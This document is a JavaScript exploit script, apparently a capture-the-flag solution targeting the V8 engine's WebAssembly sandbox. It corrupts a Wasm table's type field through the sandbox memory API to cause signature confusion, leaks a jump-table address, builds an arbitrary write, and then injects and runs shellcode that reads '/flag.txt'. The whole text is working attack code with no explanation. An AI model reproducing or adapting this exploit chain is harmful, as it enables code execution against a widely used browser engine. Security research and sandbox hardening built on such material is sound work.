function leakJumpTable() {
    const builder = new WasmModuleBuilder();
    builder.exportMemoryAs("mem0", 0);
    let $mem0 = builder.addMemory(1, 1);
  
    let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
    let $struct = builder.addStruct([makeField(kWasmI32, true)]);
  
    const leakCount = 2;
  
    let $sig_leak = builder.addType(makeSig([], Array(leakCount).fill(kWasmI64)));
    let $sig_v_v = builder.addType(kSig_v_v);
  
    let $f0 = builder.addFunction("func0", $sig_v_v)
      .exportFunc()
      .addBody([
      ]);
  
    let func1Body = []
    for (let i = 0; i < leakCount; i++) {
      func1Body.push(kExprI64Const);
      func1Body.push(0);
    }
  
    let $f1 = builder.addFunction("func1", $sig_leak).exportFunc().addBody(func1Body);
  
    let $t0 =
        builder.addTable(wasmRefType($sig_leak), 1, 1, [kExprRefFunc, $f1.index]);
    builder.addExportOfKind("table0", kExternalTable, $t0.index);
  
    builder.addFunction("boom", $sig_leak)
      .exportFunc()
      .addBody([
        kExprI32Const, 0,  // func index
        kExprCallIndirect, $sig_leak, kTableZero,
      ])
  
    let instance = builder.instantiate();
  
    let boom = instance.exports.boom;
    let func0 = instance.exports.func0;
    let table0 = instance.exports.table0;
  
    // Prepare corruption utilities.
    const kHeapObjectTag = 1;
    const kWasmTableObjectTypeOffset = 32;
  
    let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  
    function getPtr(obj) {
      return Sandbox.getAddressOf(obj) + kHeapObjectTag;
    }
    function getField(obj, offset) {
      return memory.getUint32(obj + offset - kHeapObjectTag, true);
    }
    function setField(obj, offset, value) {
      memory.setUint32(obj + offset - kHeapObjectTag, value, true);
    }
  
    // Corrupt the table's type to accept putting $func0 into it.
    let t0 = getPtr(table0);
    const kRef = 9;
    const kSmiTagSize = 1;
    const kHeapTypeShift = 5;
    let expected_old_type = (($sig_leak << kHeapTypeShift) | kRef) << kSmiTagSize;
    let new_type = (($sig_v_v << kHeapTypeShift) | kRef) << kSmiTagSize;
    //assertEquals(expected_old_type, getField(t0, kWasmTableObjectTypeOffset));
    setField(t0, kWasmTableObjectTypeOffset, new_type);
  
    // This should run into a signature check that kills the process.
    table0.set(0, func0);
  
    // If the process was still alive, this would cause the sandbox violation.
    let leak = instance.exports.boom();
  
    return [instance, leak[1]];
  }
  
  function arbitraryWrite(address, value) {
    const builder = new WasmModuleBuilder();
    builder.exportMemoryAs("mem0", 0);
    let $mem0 = builder.addMemory(1, 1);
  
    let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
    let $struct = builder.addStruct([makeField(kWasmI64, true)]);
  
    let $sig_l_l = builder.addType(kSig_l_l);
    let $sig_v_struct = builder.addType(makeSig([wasmRefType($struct)], []));
  
    let $f0 = builder.addFunction("func0", $sig_v_struct)
      .exportFunc()
      .addBody([
        kExprLocalGet, 0,
        ...wasmI64Const(value),
        kGCPrefix, kExprStructSet, $struct, 0,
      ]);
  
    let $f1 = builder.addFunction("func1", $sig_l_l).exportFunc().addBody([
      kExprI64Const, 0,
    ]);
  
    let $t0 = builder.addTable(wasmRefType($sig_l_l), 1, 1, [kExprRefFunc, $f1.index]);
    builder.addExportOfKind("table0", kExternalTable, $t0.index);
  
    builder.addFunction("boom", kSig_l_l)
      .exportFunc()
      .addBody([
        kExprLocalGet, 0,  // func parameter
        kExprI32Const, 0,  // func index
        kExprCallIndirect, $sig_l_l, kTableZero,
      ])
  
    let instance = builder.instantiate();
  
    let boom = instance.exports.boom;
    let func0 = instance.exports.func0;
    let table0 = instance.exports.table0;
  
    // Prepare corruption utilities.
    const kHeapObjectTag = 1;
    const kWasmTableObjectTypeOffset = 32;
  
    let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  
    function getPtr(obj) {
      return Sandbox.getAddressOf(obj) + kHeapObjectTag;
    }
    function getField(obj, offset) {
      return memory.getUint32(obj + offset - kHeapObjectTag, true);
    }
    function setField(obj, offset, value) {
      memory.setUint32(obj + offset - kHeapObjectTag, value, true);
    }
  
    // Corrupt the table's type to accept putting $func0 into it.
    let t0 = getPtr(table0);
    const kRef = 9;
    const kSmiTagSize = 1;
    const kHeapTypeShift = 5;
    let expected_old_type = (($sig_l_l << kHeapTypeShift) | kRef) << kSmiTagSize;
    let new_type = (($sig_v_struct << kHeapTypeShift) | kRef) << kSmiTagSize;
    setField(t0, kWasmTableObjectTypeOffset, new_type);
  
    // This should run into a signature check that kills the process.
    table0.set(0, func0);
  
    // If the process was still alive, this would cause the sandbox violation.
    instance.exports.boom(address-7n);
  }
  
  function writeBytes(address, bytes) {
    for (let i = 0; i < bytes.length; i++) {
      arbitraryWrite(jmpTableAddress + BigInt(i), bytes[i]);
    }
  }
  
  const [leakInstance, jmpTableAddress] = leakJumpTable();
  console.log(`jmpTable @ 0x${jmpTableAddress.toString(16)}`);
  
  // shellcraft -f c amd64.linux.cat '/flag.txt'
  let shellcode = [0x6a, 0x74, 0x48, 0xb8, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x50, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0xf, 0x5, 0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5];
  
  writeBytes(jmpTableAddress, shellcode);
  
  leakInstance.exports.func0();
  